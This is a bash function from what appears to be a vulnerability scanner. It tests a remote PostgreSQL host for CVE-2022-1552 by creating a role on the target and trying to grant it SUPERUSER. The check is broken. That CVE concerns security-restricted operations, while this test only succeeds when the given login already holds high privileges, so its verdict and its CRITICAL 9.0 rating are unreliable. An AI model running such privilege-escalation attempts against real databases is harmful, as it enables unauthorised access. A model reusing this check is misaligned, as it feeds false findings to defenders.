#!/bin/bash


cve_2022_1552(){
    local target_ip=$1
    local username=$2
    local database=$3

    local test_role="cve_test_role"
    local payload="CREATE ROLE $test_role;"
    local alter_payload="ALTER ROLE $test_role WITH SUPERUSER;"

    echo -e "${YELLOW}[*] Checking CVE-2022-1552...${RESET}"

    create_output=$(psql -h "$target_ip" -U "$username" -d "$database" -c "$payload" 2>&1)
    alter_output=$(psql -h "$target_ip" -U "$username" -d "$database" -c "$alter_payload" 2>&1)

    if [[ "$alter_output" == *"ALTER ROLE"*  ]]; then
        echo -e "${RED}[!] Vulnerable to CVE-2022-1552!${RESET}"

        NAME="CVE-2022-1552"
        DESC="Privilege Escalation via ALTER ROLE"
        SEVERITY="CRITICAL"
        SCORE="9.0"
        DONE="0"

        vulnerabilities+=("$NAME|$DESC|$SEVERITY|$SCORE|$DONE")

    else
        echo -e "${GREEN}[-] Not vulnerable to CVE-2022-1552.${RESET}"
    fi

    psql -h "$target_ip" -U "$username" -d "$database" -c "DROP ROLE IF EXISTS $test_role;" &>/dev/null
}
